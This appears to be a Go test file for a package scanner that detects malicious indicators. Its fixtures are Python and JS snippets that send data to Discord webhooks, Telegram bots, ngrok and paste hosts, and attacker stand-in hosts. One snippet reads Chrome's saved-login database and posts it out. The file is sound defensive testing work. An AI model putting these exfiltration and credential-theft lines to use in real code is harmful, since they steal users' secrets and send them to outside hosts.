package iocscan

import "testing"

func files(m map[string]string) map[string][]byte {
	out := make(map[string][]byte, len(m))
	for k, v := range m {
		out[k] = []byte(v)
	}
	return out
}

func TestScan_Malicious(t *testing.T) {
	cases := map[string]map[string]string{
		"discord webhook (dispositive)": {
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/123/abc', json={'x': 1})\n",
		},
		"telegram bot exfil": {
			"pkg/m.py": "url = 'https://api.telegram.org/bot123:AAH/sendMessage'\n",
		},
		"ngrok tunnel sink": {
			"pkg/c2.js": "const c2 = 'https://abc123.ngrok-free.app/collect';\n",
		},
		"paste drop": {
			"pkg/x.py": "open('p','wb').write(requests.get('https://transfer.sh/abc/p').content)\n",
		},
		"oob interactsh host": {
			"pkg/x.py": "requests.get('http://x.oast.fun/')\n",
		},
		"stealer string + send (coupled)": {
			"pkg/grab.py": "import os, requests\np = os.path.expanduser('~/.config/google-chrome/Default/Login Data')\nrequests.post('http://example.com/u', data=open(p,'rb').read())\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); !r.Detected {
			t.Errorf("%s: expected detection, got none", name)
		}
	}
}

// TestScan_ReputationHost pins detection-roadmap item 4: a host on the offline
// reputation feed, referenced in source COUPLED with an actual outbound send,
// fires the strong "reputation_host" kind (reusing the MaliciousIOC wiring). A
// BARE reference (no send) stays clean (advisory only). Well-known CDNs /
// registries are allowlisted and never match even if they were on the feed.
func TestScan_ReputationHost(t *testing.T) {
	t.Run("feed host + send -> reputation_host", func(t *testing.T) {
		// paste.bingner.com is a seeded feed host; coupled with urlopen.
		fs := files(map[string]string{
			"pkg/__init__.py": "import urllib.request\nurllib.request.urlopen('https://paste.bingner.com/raw/abcd', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("feed host as bare reference (no send) stays clean", func(t *testing.T) {
		// A reference with no outbound send is advisory only — must not fire.
		fs := files(map[string]string{
			"README.md": "Historic IOC: paste.bingner.com was used by a 2022 campaign.\n",
		})
		if r := Scan(fs); r.Detected {
			t.Errorf("bare feed-host reference should stay clean, got %s (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("IP feed host + send -> reputation_host", func(t *testing.T) {
		fs := files(map[string]string{
			"pkg/x.py": "import requests\nrequests.post('http://54.254.189.27/api/v1/file/upload', data=b'x')\n",
		})
		r := Scan(fs)
		if !r.Detected {
			t.Fatalf("expected detection on IP-feed-host+send, got none")
		}
		if r.Kind != "reputation_host" {
			t.Errorf("kind = %q, want reputation_host (%s)", r.Kind, r.Detail)
		}
	})

	t.Run("exfil_host still wins over reputation_host", func(t *testing.T) {
		// A dedicated exfil sink (Tier 1) must take precedence over a generic
		// reputation hit so the more specific kind is reported.
		fs := files(map[string]string{
			"pkg/__init__.py": "import requests\nrequests.post('https://discord.com/api/webhooks/1/abc', data=b'x')\nx = 'paste.bingner.com'\n",
		})
		r := Scan(fs)
		if r.Kind != "exfil_host" {
			t.Errorf("kind = %q, want exfil_host (more specific should win)", r.Kind)
		}
	})
}

// TestScan_ReputationFeedAllowlist verifies a CDN/registry host is never
// matched as a reputation hit, even coupled with a send — the allowlist guard
// against false positives on legitimate package fetches.
func TestScan_ReputationFeedAllowlist(t *testing.T) {
	// Build a scanner whose feed deliberately includes an allowlisted host to
	// prove the allowlist suppresses it.
	m := newReputationMatcherFromLines([]string{
		"registry.npmjs.org", // allowlisted — must NOT match
		"evil-c2.example",    // not allowlisted — must match
	})
	cleanFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.get('https://registry.npmjs.org/lodash')\n",
	})
	if hit, _ := m.match(cleanFS, true); hit {
		t.Errorf("allowlisted CDN host on feed must not match")
	}
	dirtyFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://c2.evil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(dirtyFS, true); !hit {
		t.Errorf("non-allowlisted feed host (subdomain) coupled with send must match")
	}
	// Suffix label-boundary: "notevil-c2.example" must NOT match "evil-c2.example".
	boundaryFS := files(map[string]string{
		"pkg/__init__.py": "import requests\nrequests.post('https://notevil-c2.example/x', data=b'y')\n",
	})
	if hit, _ := m.match(boundaryFS, true); hit {
		t.Errorf("label-boundary: notevil-c2.example must not match feed entry evil-c2.example")
	}
}

func TestScan_LegitStaysClean(t *testing.T) {
	cases := map[string]map[string]string{
		"normal http client lib": {
			"pkg/client.py": "import requests\ndef get(u):\n    return requests.get(u)\n",
		},
		// A browser-cookie library legitimately READS the cred store but does
		// NOT exfil it — the coupling gate keeps it clean.
		"browser-cookie lib reads store, no exfil": {
			"pkg/cookies.py": "import sqlite3\nDB = '~/.mozilla/firefox/cookies.sqlite'\ndef load():\n    return sqlite3.connect(DB)\n",
		},
		"package referencing slack in docs/config (no webhook path)": {
			"pkg/notify.py": "SLACK = 'https://slack.com/api/chat.postMessage'\n",
		},
		"normal config with example.com": {
			"pkg/conf.py": "BASE = 'https://api.example.com/v1'\n",
		},
	}
	for name, fs := range cases {
		if r := Scan(files(fs)); r.Detected {
			t.Errorf("%s: expected clean, got %s (%s)", name, r.Kind, r.Detail)
		}
	}
}
